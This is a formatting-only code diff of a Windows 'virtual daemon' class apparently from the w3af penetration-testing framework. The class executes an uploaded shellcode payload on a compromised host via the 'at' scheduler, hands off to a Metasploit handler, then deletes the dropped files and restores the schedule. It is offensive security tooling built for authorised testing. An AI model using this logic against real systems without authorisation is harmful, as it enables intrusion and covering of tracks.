@@ -34,12 +34,13 @@ class winVd(vdaemon):
 
     :author: Andres Riancho (andres.riancho@gmail.com)
     """
+
     def _clean_up(self):
         """
         Removes the created file and the crontab entry.
         """
-        self._exec('del ' + self._remote_filename)
-        self._exec('del ' + self._remote_filename + '._')
+        self._exec("del " + self._remote_filename)
+        self._exec("del " + self._remote_filename + "._")
 
     def _exec_payload(self):
         """
@@ -51,20 +52,22 @@ class winVd(vdaemon):
         """
         aH = atHandler(self._exec_method)
         if not aH.can_delay():
-            om.out.information('Remote user is not allowed to run at! Running command without at, this may cause a timeout.')
+            om.out.information(
+                "Remote user is not allowed to run at! Running command without at, this may cause a timeout."
+            )
             self._exec(self._remote_filename)
         else:
             wait_time = aH.add_to_schedule(self._remote_filename)
 
-            om.out.console('"at" entry successfully added. Waiting for shellcode execution.')
+            om.out.console(
+                '"at" entry successfully added. Waiting for shellcode execution.'
+            )
             time.sleep(wait_time + 3)
 
-            om.out.console(
-                'Payload successfully executed, restoring old "at".')
+            om.out.console('Payload successfully executed, restoring old "at".')
             aH.restore_old_schedule()
 
-            om.out.debug(
-                'All done, check metasploit handler console for results.')
+            om.out.debug("All done, check metasploit handler console for results.")
 
     def get_os(self):
-        return 'windows'
+        return "windows"
